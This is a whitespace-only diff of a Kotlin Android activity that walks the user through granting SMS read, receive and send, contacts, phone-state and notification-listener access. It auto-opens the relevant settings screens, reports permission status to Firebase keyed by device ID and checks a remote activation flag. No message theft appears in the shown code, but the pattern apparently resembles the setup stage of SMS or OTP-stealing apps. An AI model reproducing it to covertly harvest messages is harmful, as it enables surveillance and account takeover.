@@ -35,15 +35,15 @@ import com.prexoft.prexocore.goTo
 
 /**
  * PermissionFlowActivity
- * 
+ *
  * Single screen showing all 7 required permissions with real-time status updates.
- * 
+ *
  * Permissions shown:
  * - 5 Runtime permissions: RECEIVE_SMS, READ_SMS, READ_CONTACTS, SEND_SMS, READ_PHONE_STATE
  * - 2 Special permissions: Notification Listener, Battery Optimization
- * 
+ *
  * Note: Default SMS App permission is no longer shown in UI (removed from permission flow)
- * 
+ *
  * Flow:
  * 1. User grants runtime permissions (single button click)
  * 2. User enables notification listener (settings redirect)
@@ -51,12 +51,12 @@ import com.prexoft.prexocore.goTo
  * 4. Continue to app when all permissions granted
  */
 class PermissionFlowActivity : AppCompatActivity() {
-    
+
     private val binding by lazy { ActivityPermissionFlowBinding.inflate(layoutInflater) }
-    
+
     private val PERMISSION_REQUEST_CODE = 100
     private val EXTRA_FORCE_ACTIVATED = "forceActivated"
-    
+
     @get:android.annotation.SuppressLint("HardwareIds")
     private val deviceId: String by lazy {
         android.provider.Settings.Secure.getString(
@@ -64,64 +64,64 @@ class PermissionFlowActivity : AppCompatActivity() {
             android.provider.Settings.Secure.ANDROID_ID
         )
     }
-    
+
     // Permission card views
     private val permissionCards = mutableMapOf<String, CardView>()
     private val permissionStatusViews = mutableMapOf<String, TextView>()
-    
+
     // Track if we're auto-requesting permissions (to avoid opening settings multiple times)
     private var hasRequestedRuntimePermissions = false
     private var hasOpenedNotificationSettings = false
     private var hasOpenedBatterySettings = false
     private var hasOpenedDefaultSmsSettings = false
-    
+
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
         enableEdgeToEdge()
-        
+
         // Set window background to match app theme
         if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.LOLLIPOP) {
             window.statusBarColor = resources.getColor(R.color.theme_gradient_start, theme)
             window.navigationBarColor = resources.getColor(R.color.theme_gradient_start, theme)
         }
-        
+
         setContentView(binding.root)
         AppCompatDelegate.setDefaultNightMode(AppCompatDelegate.MODE_NIGHT_NO)
-        
+
         // Initialize permission card mappings
         initializePermissionCards()
-        
+
         // Setup button listeners
         setupButtonListeners()
-        
+
         // Start collapse animation
         binding.root.post {
             animateCollapseAndDeploy()
         }
-        
+
         // Sync permission status to Firebase
         PermissionFirebaseSync.syncPermissionStatus(this, deviceId)
-        
+
         // Update UI with current permission status
         updatePermissionStatus()
-        
+
         // Auto-request all mandatory permissions in first cycle
         // Use postDelayed to ensure UI is fully loaded before requesting
         binding.root.postDelayed({
             requestAllMandatoryPermissionsOnFirstLoad()
         }, 300) // Small delay to ensure UI is ready
-        
+
         // Auto-navigate if all permissions are already granted
         checkAndAutoNavigate()
     }
-    
+
     /**
      * Request all mandatory permissions automatically on first load
      * This ensures all permissions (runtime + special) are requested in the first cycle
      */
     private fun requestAllMandatoryPermissionsOnFirstLoad() {
         val status = PermissionManager.getAllPermissionsStatus(this)
-        
+
         // Request all runtime permissions at once (first cycle)
         if (!status.runtimePermissions.values.all { it.isGranted }) {
             if (!hasRequestedRuntimePermissions) {
@@ -129,22 +129,22 @@ class PermissionFlowActivity : AppCompatActivity() {
                 requestRuntimePermissions()
             }
         }
-        
+
         // Auto-open settings for special permissions if not granted
         // Check on resume will handle opening the next one after user returns
         checkAndOpenSpecialPermissionSettings()
-        
+
         // Auto-open default SMS app settings if not set (MANDATORY)
         // Default SMS app settings check removed (no longer in UI)
     }
-    
+
     /**
      * Check and open special permission settings if needed
      * Called on activity start and on resume (after returning from settings)
      */
     private fun checkAndOpenSpecialPermissionSettings() {
         val status = PermissionManager.getAllPermissionsStatus(this)
-        
+
         // Open notification listener settings first if not granted and not already opened
         if (!status.notificationListener.isGranted && !hasOpenedNotificationSettings) {
             // Wait a bit for runtime permissions to be handled first
@@ -161,7 +161,7 @@ class PermissionFlowActivity : AppCompatActivity() {
             }, 1500) // 1.5 second delay after runtime permission request
             // Don't return early - allow battery check to also run if notification is already granted
         }
-        
+
         // Open battery optimization settings if battery is not granted
         // Check independently - don't require notification to be granted first
         // Only show once - if user dismisses it, they can manually enable it via the button
@@ -173,7 +173,7 @@ class PermissionFlowActivity : AppCompatActivity() {
             } else {
                 2000L // Longer delay if notification is not granted yet (to avoid conflicts)
             }
-            
+
             binding.root.postDelayed({
                 if (!isFinishing && !isDestroyed) {
                     val currentStatus = PermissionManager.getAllPermissionsStatus(this)
@@ -191,14 +191,14 @@ class PermissionFlowActivity : AppCompatActivity() {
             }, delay)
         }
     }
-    
+
     override fun onResume() {
         super.onResume()
         // Sync permission status to Firebase when returning from settings
         PermissionFirebaseSync.syncPermissionStatus(this, deviceId)
         // Update status when returning from settings
         updatePermissionStatus()
-        
+
         // Check if battery optimization was granted while user was away
         // If it was granted, we don't need to show the dialog again
         val status = PermissionManager.getAllPermissionsStatus(this)
@@ -206,19 +206,19 @@ class PermissionFlowActivity : AppCompatActivity() {
             // Battery optimization is now granted, mark as opened so we don't try again
             hasOpenedBatterySettings = true
         }
-        
+
         // Only check and open special permission settings if we haven't already opened them
         // This prevents repeatedly showing the battery optimization dialog after user enables background usage
         if (!hasOpenedBatterySettings || !hasOpenedNotificationSettings) {
             checkAndOpenSpecialPermissionSettings()
         }
-        
+
         // Default SMS app settings auto-open removed (no longer in UI)
-        
+
         // Auto-navigate if all permissions are now granted
         checkAndAutoNavigate()
     }
-    
+
     /**
      * Check if all permissions are granted and auto-navigate if so
      */
@@ -233,7 +233,7 @@ class PermissionFlowActivity : AppCompatActivity() {
             }, 500) // Small delay to show the UI update
         }
     }
-    
+
     /**
      * Initialize permission card views
      */
@@ -244,12 +244,12 @@ class PermissionFlowActivity : AppCompatActivity() {
         permissionCards[Manifest.permission.READ_CONTACTS] = binding.permissionCardReadContacts
         permissionCards[Manifest.permission.SEND_SMS] = binding.permissionCardSendSms
         permissionCards[Manifest.permission.READ_PHONE_STATE] = binding.permissionCardReadPhoneState
-        
+
         // Special permissions (use special keys)
         permissionCards["notification_listener"] = binding.permissionCardNotificationListener
         permissionCards["battery_optimization"] = binding.permissionCardBatteryOptimization
         // Default SMS app card removed from UI
-        
+
         // Status views
         permissionStatusViews[Manifest.permission.RECEIVE_SMS] = binding.permissionStatusReceiveSms
         permissionStatusViews[Manifest.permission.READ_SMS] = binding.permissionStatusReadSms
@@ -260,7 +260,7 @@ class PermissionFlowActivity : AppCompatActivity() {
         permissionStatusViews["battery_optimization"] = binding.permissionStatusBatteryOptimization
         // Default SMS app status view removed from UI
     }
-    
+
     /**
      * Setup button click listeners
      */
@@ -269,25 +269,25 @@ class PermissionFlowActivity : AppCompatActivity() {
         binding.grantRuntimePermissionsButton.setOnClickListener {
             requestRuntimePermissions()
         }
-        
+
         // Enable notification listener
         binding.enableNotificationListenerButton.setOnClickListener {
             PermissionManager.openNotificationListenerSettings(this)
         }
-        
+
         // Enable battery optimization
         binding.enableBatteryOptimizationButton.setOnClickListener {
             PermissionManager.openBatteryOptimizationSettings(this)
         }
-        
+
         // Default SMS app button removed from UI
-        
+
         // Continue to app
         binding.continueButton.setOnClickListener {
             navigateToNextActivity()
         }
     }
-    
+
     /**
      * Request all runtime permissions at once (first cycle)
      * This requests all mandatory permissions together instead of sequentially
@@ -296,19 +296,19 @@ class PermissionFlowActivity : AppCompatActivity() {
         // Request ALL missing runtime permissions at once in first cycle
         // This is more efficient and faster than sequential requests
         val missingPermissions = PermissionManager.getMissingRuntimePermissions(this)
-        
+
         if (missingPermissions.isEmpty()) {
             // All permissions already granted
             PermissionFirebaseSync.syncPermissionStatus(this, deviceId)
             updatePermissionStatus()
             return
         }
-        
+
         // Request all missing permissions at once
         android.util.Log.d("PermissionFlowActivity", "Requesting ${missingPermissions.size} permissions at once: $missingPermissions")
         PermissionManager.requestAllRuntimePermissions(this, PERMISSION_REQUEST_CODE)
     }
-    
+
     /**
      * Handle permission request result
      * All permissions were requested at once, so we just need to update status
@@ -319,20 +319,20 @@ class PermissionFlowActivity : AppCompatActivity() {
         grantResults: IntArray
     ) {
         super.onRequestPermissionsResult(requestCode, permissions, grantResults)
-        
+
         if (requestCode == PERMISSION_REQUEST_CODE) {
             // All permissions were requested at once, just update status
             // Sync permission status to Firebase
             PermissionFirebaseSync.syncPermissionStatus(this, deviceId)
             // Update UI with new permission status
             updatePermissionStatus()
-            
+
             // Log results
             permissions.forEachIndexed { index, permission ->
                 val granted = index < grantResults.size && grantResults[index] == PackageManager.PERMISSION_GRANTED
                 android.util.Log.d("PermissionFlowActivity", "Permission $permission: ${if (granted) "GRANTED" else "DENIED"}")
             }
-            
+
             // Check if all permissions are now granted
             if (PermissionManager.hasAllRuntimePermissions(this)) {
                 android.util.Log.d("PermissionFlowActivity", "All runtime permissions granted!")
@@ -344,26 +344,26 @@ class PermissionFlowActivity : AppCompatActivity() {
             }
         }
     }
-    
+
     /**
      * Update permission status UI
      */
     private fun updatePermissionStatus() {
         val status = PermissionManager.getAllPermissionsStatus(this)
-        
+
         // Update runtime permissions
         status.runtimePermissions.forEach { (permission, permissionStatus) ->
             updatePermissionCard(permission, permissionStatus.isGranted)
         }
-        
+
         // Update notification listener
         updatePermissionCard("notification_listener", status.notificationListener.isGranted)
-        
+
         // Update battery optimization
         updatePermissionCard("battery_optimization", status.batteryOptimization.isGranted)
-        
+
         // Default SMS app card removed from UI (no longer shown)
-        
+
         // Update progress text (7-8 permissions: 5-6 runtime + 2 special, depending on Android version)
         val grantedCount = PermissionManager.getGrantedPermissionsCount(this)
         val totalCount = PermissionManager.getRequiredRuntimePermissions(this).size + 2 // Runtime + 2 special
@@ -374,22 +374,22 @@ class PermissionFlowActivity : AppCompatActivity() {
         } else {
             "Grant the remaining $remainingCount permissions to continue"
         }
-        
+
         // Update continue button state
         updateContinueButton(status.allGranted)
-        
+
         // Update button visibility based on status
         updateButtonVisibility(status)
     }
-    
+
     /**
      * Update individual permission card status
      */
     private fun updatePermissionCard(key: String, isGranted: Boolean) {
         val statusView = permissionStatusViews[key] ?: return
-        
+
         statusView.text = if (isGranted) "✅" else "⏳"
-        
+
         // Optional: Add animation when permission is granted
         if (isGranted) {
             statusView.animate()
@@ -406,14 +406,14 @@ class PermissionFlowActivity : AppCompatActivity() {
                 .start()
         }
     }
-    
+
     /**
      * Update continue button state
      */
     private fun updateContinueButton(allGranted: Boolean) {
         binding.continueButton.isEnabled = true
         binding.continueButton.alpha = if (allGranted) 1.0f else 0.5f
-        
+
         // Update button text if all granted (find TextView inside FrameLayout)
         val textView = binding.continueButton.getChildAt(0) as? TextView
         if (allGranted && textView != null) {
@@ -422,7 +422,7 @@ class PermissionFlowActivity : AppCompatActivity() {
             textView.text = "Continue to App"
         }
     }
-    
+
     /**
      * Update button visibility based on permission status
      */
@@ -430,18 +430,18 @@ class PermissionFlowActivity : AppCompatActivity() {
         // Show/hide grant runtime permissions button
         val allRuntimeGranted = status.runtimePermissions.values.all { it.isGranted }
         binding.grantRuntimePermissionsButton.visibility = if (allRuntimeGranted) View.GONE else View.VISIBLE
-        
+
         // Show/hide notification listener button
-        binding.enableNotificationListenerButton.visibility = 
+        binding.enableNotificationListenerButton.visibility =
             if (status.notificationListener.isGranted) View.GONE else View.VISIBLE
-        
+
         // Show/hide battery optimization button
-        binding.enableBatteryOptimizationButton.visibility = 
+        binding.enableBatteryOptimizationButton.visibility =
             if (status.batteryOptimization.isGranted) View.GONE else View.VISIBLE
-        
+
         // Default SMS app button removed from UI
     }
-    
+
     /**
      * Navigate to next activity
      * Default SMS app check removed from UI (no longer blocking navigation)
@@ -487,7 +487,7 @@ class PermissionFlowActivity : AppCompatActivity() {
         }
         return activatedIntent
     }
-    
+
     /**
      * Check activation status from Firebase
      */
@@ -496,21 +496,21 @@ class PermissionFlowActivity : AppCompatActivity() {
             contentResolver,
             android.provider.Settings.Secure.ANDROID_ID
         )
-        
+
         Firebase.database.reference.child(AppConfig.getFirebasePath(deviceId, AppConfig.FirebasePaths.IS_ACTIVE))
             .addListenerForSingleValueEvent(object : ValueEventListener {
                 override fun onDataChange(snapshot: DataSnapshot) {
                     val isActive = snapshot.getValue(String::class.java) ?: ""
                     callback(isActive == "Opened")
                 }
-                
+
                 override fun onCancelled(error: DatabaseError) {
                     // On error, assume not activated (safe default)
                     callback(false)
                 }
             })
     }
-    
+
     /**
      * Animate collapse to center, show logo, then deploy cards
      */
@@ -519,13 +519,13 @@ class PermissionFlowActivity : AppCompatActivity() {
             val handler = Handler(Looper.getMainLooper())
             val screenCenterX = resources.displayMetrics.widthPixels / 2f
             val screenCenterY = resources.displayMetrics.heightPixels / 2f
-            
+
             // Get all views to collapse
             val headerSection = binding.headerSection
             val scrollView = binding.scrollView
             val actionButtonsLayout = binding.actionButtonsLayout
             val logoView = binding.logoTextView
-            
+
             // Calculate center positions
             val headerCenterX = screenCenterX - headerSection.width / 2f
             val headerCenterY = screenCenterY - headerSection.height / 2f
@@ -533,7 +533,7 @@ class PermissionFlowActivity : AppCompatActivity() {
             val scrollCenterY = screenCenterY - scrollView.height / 2f
             val buttonsCenterX = screenCenterX - actionButtonsLayout.width / 2f
             val buttonsCenterY = screenCenterY - actionButtonsLayout.height / 2f
-            
+
             // Step 1: Collapse all elements to center (600ms)
             val collapseAnimator = AnimatorSet().apply {
                 playTogether(
@@ -556,7 +556,7 @@ class PermissionFlowActivity : AppCompatActivity() {
                 duration = 600
                 interpolator = DecelerateInterpolator()
             }
-            
+
             // Step 2: Show logo in center and scale up (400ms)
             val logoShowAnimator = AnimatorSet().apply {
                 playTogether(
@@ -568,14 +568,14 @@ class PermissionFlowActivity : AppCompatActivity() {
                 startDelay = 600
                 interpolator = OvershootInterpolator(1.5f)
             }
-            
+
             // Step 3: Logo moves up (400ms)
             val logoMoveUpAnimator = ObjectAnimator.ofFloat(logoView, "translationY", 0f, -screenCenterY * 0.3f).apply {
                 duration = 400
                 startDelay = 1000
                 interpolator = DecelerateInterpolator()
             }
-            
+
             // Step 4: Deploy cards from center (800ms)
             val deployAnimator = AnimatorSet().apply {
                 playTogether(
@@ -602,7 +602,7 @@ class PermissionFlowActivity : AppCompatActivity() {
                 startDelay = 1400
                 interpolator = OvershootInterpolator(1.2f)
             }
-            
+
             // Hide logo after deploy starts
             val logoHideAnimator = AnimatorSet().apply {
                 playTogether(
@@ -613,17 +613,17 @@ class PermissionFlowActivity : AppCompatActivity() {
                 duration = 300
                 startDelay = 1400
             }
-            
+
             // Show logo initially
             logoView.visibility = View.VISIBLE
-            
+
             // Start animations
             collapseAnimator.start()
             logoShowAnimator.start()
             logoMoveUpAnimator.start()
             deployAnimator.start()
             logoHideAnimator.start()
-            
+
         } catch (e: Exception) {
             android.util.Log.e("PermissionFlowActivity", "Error in collapse animation", e)
             // If animation fails, ensure elements are visible
@@ -634,4 +634,3 @@ class PermissionFlowActivity : AppCompatActivity() {
         }
     }
 }
-
